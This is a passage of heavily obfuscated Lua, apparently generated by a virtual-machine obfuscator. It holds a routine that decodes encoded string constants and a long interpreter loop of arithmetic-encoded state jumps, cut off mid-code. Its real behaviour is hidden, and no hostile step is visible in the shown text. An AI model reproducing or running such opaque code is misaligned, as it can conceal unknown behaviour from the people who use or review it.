7+86328,["."]=796213-796153;H=184494-184422,E=1638844224%8033550,f=443267626%8691521,O=2220089273%11872135;["="]=562695-562673,["@"]=556785+-556750,["4"]=888205197%5693623;["\""]=620344-620339}for o=-166437+166438,#d,-294249+294250 do local b=d[o]if r(b)=="string"then local r=W(b,-522991-(-522992),510577-510576)if r=="*"then b=W(b,-253030-(-253032))local r=I(b)local O={}local i=-849914+849915 local N=1010036976%5872308 local f=-250536+250536 while i<=r do local o=W(b,i,i)local I=Q[o]if I then N=N+I*((97055074%829530)^(((800828-800825)-f)))f=f+160487893%1138212 if f==-310826+310830 then f=63042000%504336 local o=j(N/(58275538%3233889))local I=j((N%(-551539-(-617075)))/(390764-390508))local W=N%(146346427%1644339)A(O,t(o,I,W))N=-998655-(-998655)end elseif o=="="then A(O,t(j(N/(106403+-40867))))if i>=r or W(b,i+2011115681%14365112,i+(640372+-640371))~="="then A(O,t(j((N%(586610+-521074))/(2542362152%14282932))))end break end i=i+(-904635-(-904636))end d[o]=U(O)elseif r=="+"then b=W(b,252138-252136)local r=I(b)local Q={}local i=3437175533%14441914 while i<=r do local o=(r-i)+(191590+-191589)local I=o>=957379-957374 and 1497710363%6870231 or o local U=701942+-701942 local d=I>873875769%5904566 for o=573490+-573490,-639604+639608,-295976-(-295977)do local t if o<I then local I=W(b,i+o,i+o)t=O[I]if not t then d=false break end else t=191146776%15928891 end U=U*(-313301-(-313386))+t end if d then local o=j(U/(3981053168%24622832))%(-923773-(-924029))local W=j(U/(-437998+503534))%(180518+-180262)local d=j(U/(1629155464%6542792))%(1820295696%9892910)local r=U%(1253666464%8247804)if I==226343+-226338 then A(Q,t(o,W,d,r))elseif I==-219363-(-219367)then A(Q,t(o,W,d))elseif I==30332865%206346 then A(Q,t(o,W))elseif I==-293545+293547 then A(Q,t(o))end end i=i+I end d[o]=U(Q)end end end end return(function(j,A,o,U,d,W,r,P,e,b,k,f,D,O,N,G,K,i,M,h,Q,I,v)P,v,k,I,i,f,h,O,M,G,Q,N,K,b,e,D=function(o,t)local W=N(t)local U=function(U,j,A)return I(o,{U,j;A},t,W)end return U end,function(o,t)local W=N(t)local U=function(...)return I(o,{...},t,W)end return U end,function(o)O[o]=O[o]-21076707%257033 if O[o]==937917+-937917 then O[o],Q[o]=nil,nil end end,function(I,U,j,A)local NR,a,y,vR,R,f,J,m,IR,E,WR,PR,q,p,z,bR,X,S,tR,UR,OR,i,B,dR,Z,L,r,n,iR,w,kR,AR,T,l,O,x,fR,F,u,jR,Y,QR,V,H,g,s,rR,oR,C,N,v,c while I do if I>1191387398%9535523 then if I>749431+11872266 then if 1623553978%22653620>I then if-1008127+15199152>I then if I<3593072574%23864793 then if 3706832488%18655802>I then if I<760312+11906955 then z=2124830655%19397201~=2422240644%16112109 I=z and 14130576-61410 or-84259+1023807 elseif I<867707+11839241 then I=12431452-639220 C=Q[v]r=C elseif 12687907-(-154469)>I then N=t(-880699+875178)i=o[N]r,I=i,i and-356395+5123772 or 9261819-800249 else N=t(801494-807033)i=o[N]r,I=i,i and 5675597-676789 or-864379+2823862 end else if 6304+13021422>I then v=Q[j[-340075+340077]]u=Q[j[983745-983742]]Y,T=-963518+14501326841983,t(-557745+552226)C=u(T,Y)r=v[C]I=N[r]r={I}I=o[t(-413421+407886)]elseif I<945748199%16360692 then N,i=2798795326%18186284,t(251030-256808)O=i^N r=1101419480%8582407 I=r-O O,r=I,t(1006853-1012607)I=r/O r={I}I=o[t(-165354-(-159653))]else z=P(872826-(-277161),{f})R={z()}r,I={W(R)},o[t(-45217+39852)]end end else if I<-476207+14451674 then if I<6927544929%30060950 then q=t(436725-442286)R=o[q]Y,q,I=l,t(190630+-196350),-475311+8675241 z=R[q]R=z(O,Y)z=Q[j[226283898%1236524]]q=z()F=R+q B=F+C F=-185638-(-185894)y=B%F Y,R,C=nil,291945+-291944,y z=C+R F=f[z]B=T..F T=B elseif I<13088623-(-682549)then C,y=u,t(-486548-(-480943))r=Q[j[437102+-437096]]l=Q[j[989441-989439]]B=32992798020514-(-124004)X=Q[j[778680+-778677]]s=X(y,B)w=l[s]Y=T[w]w=T T=nil r[Y]=w C,I=nil,382420899%15776738 else I=r and 47393+16190159 or 8491939-(-972670)end else if 13702467-(-398444)>I then q,m=389484+-389483,1421766206%7108831 z=Q[C]R=z(q,m)z,m=t(477665-483311),t(-801607-(-795961))o[z]=R q=o[m]m=-772662-(-772664)z=q>m I=z and 99171+2176226 or 12110546-675701 elseif 2120786660%30530980>I then u=Q[j[1615044914%11788649]]C=Q[j[1062947816%10421057]]Y,w,s=t(-2509-3168),27181530725143-677941,33910875798153-376620 T=C(Y,w)v=u[T]X=t(901116+-906838)f=O[v]T=t(-899782-(-894396))C=o[T]Y=Q[j[1026546697%4752531]]w=Q[j[175607672%2621010]]l=w(X,s)T=Y[l]u=C[T]I=568050+8392735 T=Q[j[-720309-(-720310)]]l=t(-486857-(-481199))Y=Q[j[-109603+109605]]X=-634548+4870642188396 w=Y(l,X)C=T[w]v=u[C]N=f==v r=N else I=r and 6265567-41505 or 12153300-728183 end end end else if I<232359+14304277 then if I>14133072-(-143460)then if 1517970946%30072470>I then C,N=not u,N+v r=f>=N r=C and r C=N>=f C=u and C r=C or r C=14769379-(-384236)I=r and C r=2002938544%20159079 I=I or r elseif I<4638984546%19189066 then I=Q[j[-268392+268393]]i,T,Y=N,-630900-(-630900),81406866%631059 C=I(T,Y)O[i]=C i,I=nil,300357571%10071859 else X,I=y,B I=y and 10921389-(-156069)or 3503819-951421 end else if I<6688572304%28893298 then I=r and-878395+8871983 or 13485436-510960 elseif-449454+14680160>I then v=Q[j[-126436+126443]]l=643636+35014715059501 C=Q[j[57685124%291339]]w=t(184870+-190332)T=Q[j[298511112%2551377]]Y=T(w,l)u=C[Y]s,y,Y=t(-133187-(-127460)),42913+25468859528454,t(579760-585458)T=o[Y]w=Q[j[147111-147109]]l=Q[j[-209379-(-209382)]]X=l(s,y)i=nil Y=w[X]C=T[Y]l,s,w,Y=3022223600%15111118,946590-946557,-899900-(-899900),247024008%1960508 X=f*s T=C(Y,w,l,X)w,X,s,I=t(-949885+944233),t(955214-960958),387884+13441509967290,o[t(-91140-(-85731))]v[u]=T N,l=nil,25426982428642-66402 v=Q[j[923005+-922992]]r={}C=Q[j[273785072%9126169]]T=Q[j[-397868+397871]]Y=T(w,l)O=nil u=C[Y]Y=Q[j[932479-932477]]w=Q[j[-47649+47652]]l=w(X,s)T=Y[l]C=T..f f=nil v[u]=C else I,r=o[t(-768184+762547)],{i}end end else if I<2085445072%17254159 then if I<14407768-(-235623)then v,f=-821431-(-821433),387052+-387051 i=Q[j[1044864+-1044863]]N=i(f,v)i=28743537%14371768 O=N==i I,r=O and 959550+13205875 or 8070102-(-942397),O elseif I<14608030-(-194854)then I,C=13422841-(-893116),nil else oR=Q[i]n=I I,r=oR and-297641+16882340 or-459374+16520793,oR end else if-706934+15679295>I then I,f=C,u I=437044263%22128292 elseif 405805+14656671>I then I=Q[j[1651631851%10865999]]C=t(-398268-(-392876))f=Q[j[-722358+722359]]T,r=-174885+19206606319876,t(192632-198054)v=Q[j[203240-203238]]r=I[r]u=v(C,T)N=f[u]i=O[N]T,N=816825+22102575405487,1269000-996607>=4412717755%27325251 r=r(I,i,N)C,i,u=33928055860302-45281,r,t(-702134+696508)N=Q[j[-732407+732408]]f=Q[j[-999741-(-999743)]]v=f(u,C)r=N[v]f=Q[j[65026041%1625651]]C=t(-692597+687236)v=Q[j[620341-620339]]u=v(C,T)N=f[u]f=-7008+7208 I={[r]=i,[N]=f}r={I}I=o[t(-951229+945671)]else r,O=t(-67277-(-61474)),t(-964963-(-959294))I=o[r]r=I(O)I,r=o[t(798730-804345)],{}end end end end else if I<4482871214%18534967 then if I<4614221952%25407496 then if I<6201617691%28640363 then if I<-1043968+16255440 then r,C=838906-838906,N I=C==r I=I and-964094+8334559 or 2756852-(-455022)elseif I<15743809-468079 then I=-640564+8222491 else R=w==X B,I=R,-212263+9595973 end else if 333930+15012459>I then I=-419821+6296736 elseif 15717504-312490>I then r,I={},o[t(353835+-359222)]else u,C,i=t(-690850-(-685429)),832634+34243744712729,t(326314+-331713)r=o[i]N=Q[j[120932+-120931]]f=Q[j[-944829+944831]]v=f(u,C)i=N[v]I=r[i]r={I(O)}I,r=o[t(-335594+330147)],{W(r)}end end else if I<6841652723%27087163 then if I<15021546-(-516080)then y=#w p,s=1191261885%10269499,838970+-838969 X=v(s,y)s=l(w,X)y=Q[C]X=nil m=s-p F=N(m)y[s]=F F=#w s,m=nil,-1015231+1015231 y=F==m I=y and 10755561-211111 or 40289+15456376 elseif 16043210-426989>I then u,i,C=t(585025-590706),t(-354027+348506),633527552191-542321 r=o[i]N=Q[j[1252958218%13472669]]f=Q[j[514480+-514478]]v=f(u,C)i=N[v]I=r[i]r={I(O)}I,r=o[t(643380+-648829)],{W(r)}else N=Q[j[107177-107171]]i=N==O I,r=8328990-654900,i end else if 2668465295%21923230>I then I=12512542-(-118372)elseif-317546+16162638>I then v,w=t(-852154+846419),567986+31000945706517 r=o[v]u=Q[j[638351513%7422692]]C=Q[j[124964+-124962]]Y=t(756151+-761651)T=C(Y,w)v=u[T]u=t(303102-308906)I=r[v]v=o[u]r=I(v,f)I=9905167-806137 else f=k(f)l=k(l)F=k(F)y,u,X,w=nil,nil,nil,nil Y=k(Y)l,I=t(70946+-76672),8643176-(-102563)C=k(C)N=k(N)C,N=t(-481741-(-476015)),nil v=k(v)s,u=nil,t(-984959+979398)i=k(i)T=nil f=b()i,s=nil,t(927466-933117)Q[f]=i i=b()Q[i]=N v=o[u]u=t(-795897+790477)N=v[u]u=o[C]C=t(-346545-(-341099))v=u[C]u=b()C=b()Q[u]=v Y=b()v={}T=b()Q[C]=v v=1273331108%6151358 Q[T]=v v=826682+-826682 Q[Y]=v w=o[l]l=t(-289779-(-284201))v=w[l]w={}X=o[s]s=t(-136596-(-131044))l=X[s]s,X=-598451+598707,1707592977%8847632 y=s s=-1005054-(-1005055)F=s s=1163328219%9457953 m=s>F s=X-F end end end else if 16627996-161317>I then if I<17088235-1017088 then if 1383196456%17306129>I then J=-361387+361388 Q[i]=n I=oR g=Q[a]E=g+J I=1433548-572850 c=L[E]V=w+c c=-160165+160421 oR=V%c E=Q[H]c=X+E E,w=770360-770104,oR V=c%E X=V elseif 626311354%30513060>I then I,r=-937341+8812654<=846387489%13240213,{}Q[j[-439662+439663]]=I I=o[t(686013-691509)]else I=n Q[i]=r I=289513+571185 end else if 6235944484%24780021>I then I=13396666-765752 elseif I<-875067+17207342 then r,I={},o[t(-878428-(-872763))]else I=Q[j[-683381+683382]]Q[j[450736-450734]]=I w=t(588159-593842)r=Q[j[-986431+986434]]i=Q[j[106899832%2545234]]u,R,l,v=-93667+27205153181915,29068151341386-(-665717),8376514645499-(-954494),t(-539859-(-534385))N=Q[j[310435569%3302506]]m=781112+31684939909132 f=N(v,u)O=i[f]f=Q[j[-699318+699322]]a,C=-600051+7722587472907,t(558193+-563888)v=Q[j[-35233+35238]]T=886395+24278042661335 u=v(C,T)N=f[u]v=Q[j[633417063%8921367]]C=Q[j[-955134+955138]]T=Q[j[50914+-50909]]Y=T(w,l)z=t(438766+-444161)u=C[Y]C=t(-908220+902712)f=v[u]v=t(972158+-977586)i=N..f X,u=8735156294694-(-19361),22903611352732-(-715958)r[O]=i r=Q[j[1767370219%16364539]]i=Q[j[373804+-373800]]N=Q[j[-441705-(-441710)]]f=N(v,u)O=i[f]T=12243178795013-885627 f=Q[j[91384754%1986625]]l=t(698294+-704087)v=Q[j[253800+-253795]]q=t(-1826-3616)u=v(C,T)N=f[u]v=Q[j[1649707021%8460036]]T=Q[j[777080885%3944573]]H=t(858859-864315)Y=Q[j[2700588729%13109654]]w=Y(l,X)C=T[w]w=t(1006911+-1012532)Y=o[w]X=Q[j[1042600521%6318791]]y=Q[j[-726135+726139]]B=Q[j[667828355%3180135]]F=B(z,R)B=t(-423341+417851)s=y[F]F=9342911832705-(-900988)l=X[s]w=Y(l)X=Q[j[1936554382%11596134]]s=Q[j[-987583+987588]]y=s(B,F)l=X[y]B=t(871739+-877300)y=o[B]F=Q[j[2405301619%16588287]]I=o[t(879483+-885103)]z=Q[j[-913020+913025]]R=z(q,m)B=F[R]F=t(-968819-(-963198))s=y[B]B=o[F]R=Q[j[791922742%10420036]]m=Q[j[243787744%4975260]]p=Q[j[3084135494%13236633]]S=p(H,a)q=m[S]z=R[q]F=B(z)z,B,q=619915816%3387518,-1025472+1025473,2.3953132266465e+015%29571768429441 y=s(F,B,z)R=t(-924925+919534)B=Q[j[3327242388%14341562]]F=Q[j[-664112-(-664117)]]z=F(R,q)s=B[z]X=y..s Y=l..X T=w..Y u=C..T f=v..u i=N..f r[O]=i r=Q[j[-984887-(-984895)]]O=r()r={}end end else if-546225+17160620>I then if I<544433+16001096 then I=nil r={I}I=o[t(-98531+92711)]elseif I<-860923+17456630 then V,g=I,-211430-(-211431)E=L[g]g=-422125+7721932>=11090675-4512 c=E==g I,oR=c and 839478335%17140748 or 5012153-975422,c else r,I=f,v I=562933038%17936932 end else if I<4981221757%20685688 then r=t(-236647+231272)I=o[r]I=I and 3157056-(-49186)or-772024+10875628 elseif 1581936812%26529322>I then T=Q[i]Y=546264971%6087867~=-9952+8746987 r=T==Y I=r and 1139225054%21256841 or 6740653-(-408109)else g=-773878-(-773880)E=L[g]g=Q[Z]I=1131708696%17899555 c=E==g oR=c end end end end end else if 10615972-(-493487)>I then if I>8893167-(-1002815)then if 1935055023%22379691>I then if I<9472064-(-674549)then if-1046528+11074866>I then C,Y=v(u,C)I=C and-813305+1567504 or 4261906535%20924543 elseif 3616+10096148>I then u,T=f(v,u)I=u and 2966967714%23858904 or 9791627-(-548017)else N=t(-201318+195794)i=o[N]I,r=i and 5834242060%23574224 or 14464858-248232,i end else if 2411379224%14124464>I then r=Q[j[-510959-(-510960)]]I=not r I=I and 11230071-437806 or 272360+8021781 elseif-587442+10882796>I then u,X=t(-548878-(-543089)),5028485481550-(-937469)I=Q[j[1375832634%11963762]]N=Q[j[-682548-(-682549)]]C=863803+14187782833506 f=Q[j[2727262022%11556195]]v=f(u,C)f=t(619390-625011)i=N[v]N=o[f]u=Q[j[-228322-(-228327)]]T=Q[j[431982-431981]]Y=Q[j[-1013951+1013953]]l=t(-668341+662709)w=Y(l,X)C=T[w]v=u[C]f=N(v)O=i..f r=I(O)O=r I=O and 178022+3603725 or 4832055390%22956733 else r=279151000%1395755 f,v=r,t(509508-514864)r=o[v]I=10634853-674101 T={r(i)}u,v,C=T[-977086+977088],T[952446+-952445],T[74786+-74783]end end else if I>10599395-(-272488)then if I<174844887%20480369 then I=Q[j[-704563-(-704566)]]T,C=-711414+25352892626737,t(814079-819577)f=Q[j[3010729%71684]]v=Q[j[329194+-329192]]u=v(C,T)N=f[u]w,f,l=t(689397+-695094),I,13547814446966-407085 i=O[N]C=Q[j[934206-934205]]T=Q[j[-25697+25699]]Y=T(w,l)u=C[Y]v=O[u]N,I=v,v and 206566+8797741 or 570391063%15739361 elseif 479722803%20376430>I then R,O,r,l=-637044+31573268769616,U[1006719+-1006718],t(-938793-(-932989)),13112935152911-(-176805)I=o[r]f=Q[j[79645588%4191873]]C=Q[j[922326778%8701196]]s=-727351+33406202090174 T=Q[j[381807-381804]]w,y=t(656236-661749),-43105+8137063908859 Y=T(w,l)X,z=t(199206+-204973),8191825854813-(-515184)u=C[Y]T=Q[j[929661+-929657]]i=U[386798-386796]C=T..O Y=Q[j[-260264+260266]]w=Q[j[2869103408%13344667]]l=w(X,s)B,s=-679093+18325037883231,t(-989311+983927)T=Y[l]w=Q[j[64409666%975904]]l=Q[j[888511-888508]]X=l(s,y)y,F=t(-707418-(-701750)),t(-349803+344208)Y=w[X]l=Q[j[217959+-217957]]X=Q[j[-461227-(-461230)]]s=X(y,B)w=l[s]s=Q[j[-392426-(-392428)]]y=Q[j[-161957+161960]]B=y(F,z)X=s[B]y=Q[j[675255-675253]]z=t(496751+-502145)B=Q[j[2329970142%13951917]]F=B(z,R)s=y[F]z,l=13184878349723-122276,{[X]=s}s=Q[j[486220604%3655794]]F=t(869331-875003)y=Q[j[1723289057%9520934]]B=y(F,z)y=t(-498413-(-492655))X=s[B]s=Q[j[170917+-170912]]y=s[y]y=y(s,i)v={[u]=C,[T]=Y;[w]=l;[X]=y}u={I(f,v)}r=u[-293096-(-293097)]f,N=r,u[397422-397420]I,r=f and 1987549937%23526606 or-397036+2858807,f else l[w]=X X=Q[j[-240613-(-240615)]]I,F=s,749303+33020715534633 s=Q[j[-861179+861182]]B=t(725878+-731398)y=s(B,F)w=X[y]X,B,z=577277193%4475017,t(482862-488495),t(800569+-806153)l[w]=X X=Q[j[-720692-(-720694)]]s=Q[j[2361180104%14138803]]F=12731745978116-628915 y=s(B,F)w=X[y]y=Q[j[916959122%4366472]]T=nil B=Q[j[1003759291%4217476]]R=23526401217714-(-114916)F=B(z,R)s=y[F]p=15697509992739-(-782328)B=Q[Y]m=t(23521+-28985)z=Q[j[2274624848%9720619]]R=Q[j[-106400-(-106403)]]q=R(m,p)F=z[q]R=t(-560524-(-555121))y=B[F]X=s..y l[w]=X X=Q[j[-755575+755577]]B=t(-852666+846841)s=Q[j[819068-819065]]q,F=-808505+7419783246135,-652980+23414729427938 y=s(B,F)w=X[y]y=t(-978494+972687)s=o[y]B=Q[j[634228+-634226]]m=-381804+10858009066220 F=Q[j[-614256-(-614259)]]z=F(R,q)y=B[z]F=269291500%1122047 X=s[y]B,y=-547057+547277,651664-651444 s=X(y,B,F)l[w]=s B,q=t(-755691-(-750199)),t(-619390-(-613683))X=Q[j[-337384-(-337386)]]F=492079+31239323742070 s=Q[j[1410533859%9795374]]y=s(B,F)w=X[y]X=2880390064%15240159 l[w]=X X=Q[j[472629530%5626542]]B=t(-304705-(-299305))s=Q[j[111782-111779]]F=1312+22771537792439 y=s(B,F)w=X[y]B=t(204838+-210224)y=o[B]F=Q[j[-106851+106853]]z=Q[j[-240932-(-240935)]]R=z(q,m)B=F[R]s=y[B]q,R=24092294814045%2676921844212,t(-120868+115194)B=Q[j[32052186%16026092]]F=Q[j[990980994%10009909]]z=F(R,q)y=B[z]B,m=t(-445725-(-440302)),608243+4654812252412 X=s[y]l[w]=X X=Q[j[1472553884%8226558]]s=Q[j[-663093+663096]]F=10873042103040-574322 y=s(B,F)w=X[y]B=t(506480+-511866)y=o[B]F=Q[j[49060-49058]]z=Q[j[957694+-957691]]q=t(-249960+244321)R=z(q,m)B=F[R]q=987711+7421928999105 s=y[B]B=Q[j[-913210-(-913212)]]R=t(921900-927293)F=Q[j[-342443+342446]]z=F(R,q)y=B[z]X=s[y]l[w]=X B=t(-1045184+1039758)X=Q[j[1537098280%15846374]]I,F=-863931+10824683,17078384912641-10976 s=Q[j[200735412%4096641]]z=t(-668158-(-662389))y=s(B,F)R,B=351851+1531202217767,t(22990-28769)w=X[y]F,s,X=-711926+5759727628778,-503792+503796,f l[w]=X w=Q[j[-966069-(-966078)]]X=w(l,s)X=Q[j[611637-611635]]s=Q[j[-27297+27300]]y=s(B,F)w=X[y]X=Q[j[1914905913%8587022]]l[w]=X X=Q[Y]y=Q[j[739767+-739765]]B=Q[j[-242533-(-242536)]]F=B(z,R)z=t(301621-307370)s=y[F]R=27985786896613-(-320746)w=X[s]X=b()Q[X]=w y=Q[j[50148-50146]]B=Q[j[497906-497903]]F=B(z,R)s=y[F]w=l[s]s=t(190819-196326)y=M(17105899-678901,{X;j[-469999+470007];j[835588-835578],j[711606+-711604];j[-366315+366318];Y;j[256066187%2783328];j[933190736%5213356]})Y=k(Y)s=w[s]s=s(w,y)l=nil X=k(X)end else if I<3952372078%24332519 then O=U[170085+-170084]I=Q[j[345131+-345130]]i,N=U[-288105+288107],I I=N[i]I=I and-435566+14672673 or 1075712560%12456316 elseif I<808953+9859404 then s=b()X={}Q[s]=X N=nil X=b()g=29911065302903-240295 F=b()v,H=nil,t(-783534-(-778040))y=K(968510+4045659,{s,Y,T;u})p={}Q[X]=y L,y,m=nil,{},t(810617+-816218)u=k(u)Q[F]=y l=nil y=o[m]Z=t(753015+-758474)a=Q[F]S={[H]=a;[Z]=L}m=y(p,S)w=nil Q[i]=m y=M(175909+10287642,{F;s;C,Y;T;X})F=k(F)s=k(s)Y=k(Y)Q[f]=y T=k(T)l=431085+30173065632215 C=k(C)v,w=t(256749-262440),t(-690805+685237)X=k(X)E=t(-800+-4678)N=o[v]v,X=t(556129-561905),1226250893152-307946 C=Q[i]v=N[v]T=Q[f]Y=T(w,l)u=C[Y]v=v(N,u)l,u=t(-525590-(-519792)),t(-751154-(-745463))N=o[u]T=Q[i]Y=Q[f]u,s=t(-268392+262616),25647930040253%301740468805 w=Y(l,X)p,u,X=t(46762-52322),N[u],t(116708+-122472)C=T[w]u=u(N,C)N=b()C,y=t(142436+-148127),979390+22052107837051 Q[N]=u u=o[C]Y=Q[i]S,C=-350699+9604914085084,t(299673-305449)w=Q[f]C=u[C]l=w(X,s)T=Y[l]C=C(u,T)u=b()T,s=t(-553388-(-547697)),t(-315393-(-309610))Q[u]=C C=o[T]T=t(367516-373292)T=C[T]w=Q[i]l=Q[f]X=l(s,y)Y=w[X]T=T(C,Y)y,s=-437294+17095565732447,t(-819001+813403)w=Q[i]l=Q[f]X=l(s,y)Y=w[X]C=v[Y]Y=b()Q[Y]=C l=Q[Y]s=Q[i]y=Q[f]F=y(p,S)X=s[F]p=553777+28224164623228 w=l[X]X=Q[i]s=Q[f]F=t(-673653+668100)y=s(F,p)l=X[y]C=w==l l=Q[i]F,y,p,a=3218101744511-(-710710),t(-135197-(-129828)),15763011405828-380588,t(-855777-(-850042))X=Q[f]s=X(y,F)w=l[s]l=b()F=t(171365+-176882)Q[l]=w X=Q[i]s=Q[f]y=s(F,p)w=X[y]X=b()s=b()Q[X]=w w=-434666-(-434669)Q[s]=w w=b()y=M(7879569-618675,{i;f,N})F=h(2480163300%16796673,{w,i,f;l;N})Q[w]=y y=b()Q[y]=F p=G(11389884-32353,{w,i,f,l})F=b()S=e(788280+-550705,{y;i;f,Y})Q[F]=p p=b()Q[p]=S S=Q[p]H=S()H=o[a]Z=Q[i]L=Q[f]c=L(E,g)a=Z[c]E=t(761784+-767448)S=H[a]a=h(-269288+9084661,{i;f,s;p})H=S(a)a=t(-765855-(-760120))H=o[a]Z=Q[i]L=Q[f]g=26599543937307-(-280489)c=L(E,g)a=Z[c]S=H[a]a=e(8184218-329386,{i,f,s,F,Y,N})H=S(a)S=not C I=S and 9498818-474031 or 532208+1817943 else r,I={},o[t(-222183+216490)]end end end else if I>238281821%10402621 then if 1969406358%11805800>I then if 253096+9265786>I then I={}Q[j[988933-988927]]=I f,I=t(-1044396-(-1039040)),4345765-566578 r=o[f]C={r(i)}u,v,f=C[-581551-(-581554)],C[-1036864+1036866],C[758265-758264]elseif I<9959312-351595 then y,I=t(-853965-(-848314)),3203879965%27512136 s=o[y]y=t(634612+-640063)X=s[y]w=X else I,r=6373218-(-85347),t(281769+-287563)r=T[r]r=r(T)end else if 10255065-532401>I then I=-571506+13886473 elseif 3575319058%15569883>I then u,i=t(935220-940925),t(-614067+608494)r=o[i]C=-534705+19958248894796 N=Q[j[-365867+365868]]f=Q[j[399854-399852]]v=f(u,C)i=N[v]I=r[i]r={I(O)}I,r=o[t(-264872-(-259432))],{W(r)}else N=t(165733+-171420)i=o[N]I,r=i and 2084370678%16450039 or-579058+12162900,i end end else if I<2466536487%15263698 then if I<851066+8157337 then I,C=f,t(-942919-(-937533))u=o[C]X=930961795115-(-777016)T=Q[j[447744921%12792712]]Y=Q[j[2130902978%11098453]]l=t(-773176+767576)w=Y(l,X)l=31711784236196-(-818873)C=T[w]v=u[C]w=t(305523-311018)C=Q[j[179302+-179301]]T=Q[j[214505-214503]]r=t(522288+-528003)Y=T(w,l)r=I[r]u=C[Y]f=v[u]T,v,u=30305139904722-(-433517),-619123+4206817>=507376+8103703,t(-1018304+1012565)r=r(I,i,N,f,v)N=Q[j[712603009%9897264]]i,C=r,7385421334388-(-316266)f=Q[j[754103+-754101]]v=f(u,C)r=N[v]f=Q[j[-1034047-(-1034048)]]v=Q[j[-22817+22819]]C=t(50200-55714)u=v(C,T)N=f[u]f=28608308%114892 I={[r]=i;[N]=f}r={I}I=o[t(-466286+460831)]elseif I<1104695197%11180373 then i=Q[j[650551034%4279941]]N=Q[j[-900665-(-900668)]]I=14299221-133796 O=i==N r=O elseif I<9737161-693173 then I,r=o[t(-1054128-(-1048320))],{}else I=627635+5873939 end else if 8379808-(-853882)>I then f,I=nil,567048122%18641978 elseif I<-634356+10010386 then i,r,N=t(-550717-(-544945)),4851374290%23245510,1937883-(-904316)O=i^N I=r-O O,r=I,t(-919284-(-913916))I=r/O r={I}I=o[t(-307434+301892)]else Q[i]=B I=z z=Q[i]I=z and 6437092-(-819193)or 2791763144%14877638 end end end end else if I>-935741+12506270 then if I<12267158-396844 then if I<531312+11208950 then if I<-969278+12594081 then I=r and-404589+7627081 or 469999+-300010 elseif 11475262-(-207142)>I then f=t(-895091-(-889404))N=o[f]Y=-595954+31011684616387 v=Q[j[-641588+641589]]u=Q[j[3272394802%16361974]]T,I=t(176869+-182233),579890+11003952 C=u(T,Y)f=v[C]i=N[f]r=i else I=Q[j[624360268%14190006]]r=I()I=3242331310%19161161 end else if I<12773863-987007 then i=Q[j[-513712+513713]]I=o[t(-948861+943133)]O=#i N=Q[j[1382319625%8228093]]i=N[O]N=Q[j[461678+-461677]]f,r=nil,{i}N[O]=f elseif I<1410618978%20877950 then I,Y=u,t(-780920+775269)u,T=r,t(64260-69986)C=o[T]l,T=I,t(-91555+85977)r=C[T]C=b()Q[C]=r T=o[Y]Y=t(480335-485871)r=T[Y]T,s,Y=r,t(-634694-(-629043)),I X=o[s]I,w=X and 8982066-(-591090)or 644788+11827401,X else I=947284227%9397023 end end else if I<-93027+12477917 then if I<-563633+12628513 then O,I,r=nil,o[t(-722110-(-716662))],{}elseif I<581810+11661764 then l=t(509733-515184)w=o[l]I,r=429057329%21214856,w else I=nil r={I}I=o[t(-37473+31942)]end else if I<588658+11905035 then I=l I,r=w and-380268+5140477 or-415149+12604705,w elseif 5151439295%20721272>I then I=Q[j[1191245929%12809096]]N=Q[j[886011+-886009]]C=28489388306205-804729 f=Q[j[-78751-(-78754)]]u=t(127908+-133448)v=f(u,C)i=N[v]N=Q[j[2289074194%12373374]]O=i..N r=I(O)O=r I=not O I=I and-160933+4417831 or 3966454564%16013289 else I=4060842518%22151332 end end end else if I>5999394563%24743924 then if I<-345131+11762055 then if I<11573761-200870 then X=s p=X w[X]=p X,I=nil,5662750219%23558352 elseif 6251389567%24959994>I then r,I={},o[t(-338538+332824)]else f,T,I=t(854714+-860238),t(-929661+924057),4767132934%24249573 N=o[f]v=Q[j[543914251%10878285]]Y=23252589507853-696438 u=Q[j[182374+-182372]]C=u(T,Y)f=v[C]i=N[f]r=i end else if 10598819-(-831162)>I then I=Q[j[-412141+412148]]I=I and 1647167154%13117329 or-426477+1937947 elseif 1285878629%20891518>I then m=t(-794566-(-788920))z=o[m]I,m=2230820887%18306607,t(37217+-42987)o[m]=z else T,f=t(-90595+85190),t(184806+-190486)N=o[f]v=Q[j[-964094+964095]]I,Y=-654069-(-899836),-15904+10442457932829 u=Q[j[833282541%3736693]]C=u(T,Y)f=v[C]i=N[f]r=i end end else if I>1210423387%17129995 then if I<267432+11072946 then f,I=t(433815-439214),8752811-382892 N=o[f]Y=278889+22523495583879 v=Q[j[294506-294505]]u=Q[j[746420666%11309404]]T=t(-809283-(-803641))C=u(T,Y)f=v[C]i=N[f]r=i elseif I<11919564-566642 then m,B=not q,B+R r=z>=B r=m and r m=z<=B m=q and m r=m or r m=1388411275%24210659 I=r and m r=12242582-965438 I=I or r else w,r=-719990+26187215494074,t(775564-781368)I=o[r]N=Q[j[1669127582%12183413]]O=U[961662+-961661]u=Q[j[1027500752%4566670]]C=Q[j[-8480+8483]]Y,s=t(-951165+945527),-263720+13238567220817 T=C(Y,w)v=u[T]l=t(-776184+770751)C=Q[j[-767412-(-767416)]]u=C..O T=Q[j[767032+-767030]]Y=Q[j[-890425-(-890428)]]X=-805881+12508401039738 w=Y(l,X)C=T[w]Y=Q[j[-858297-(-858299)]]X=t(-162469+156932)w=Q[j[1053681996%7922421]]l=w(X,s)T=Y[l]f={[v]=u,[C]=T}v={I(N,f)}r,i=v[-402348+402349],v[298736027%1707063]N=r r,I=N,N and 4298916-532529 or 321322+1966363 end else if-833466+11990286>I then O,I=nil,5260088181%24887544 elseif 4582263337%26120221>I then r=t(172069+-177873)I=o[r]f=Q[j[2785498886%11009877]]u=Q[j[1145004839%13795239]]C=Q[j[2126180700%16230387]]Y,w=t(-53026+47546),-135908+31101881222153 T=C(Y,w)v=u[T]N=f[v]f=Q[j[-607091+607096]]v={I(N,f,O)}r,i=v[420876913%8768269],v[2421956459%9966899]N=r f=not N I,r=f and 13367608-(-514160)or 3862486-808313,f elseif I<-40929+11337017 then R=Q[i]B,z=R,I I=R and 3055051409%24125153 or 9634822-251112 else I,r=14354870%11893099,N end end end end end end else if I<-148261+4983480 then if I<1781209234%16169454 then if 1029120+609329>I then if I<4070404355%17243662 then if I<49465316%590098 then if I<506475094%12984204 then 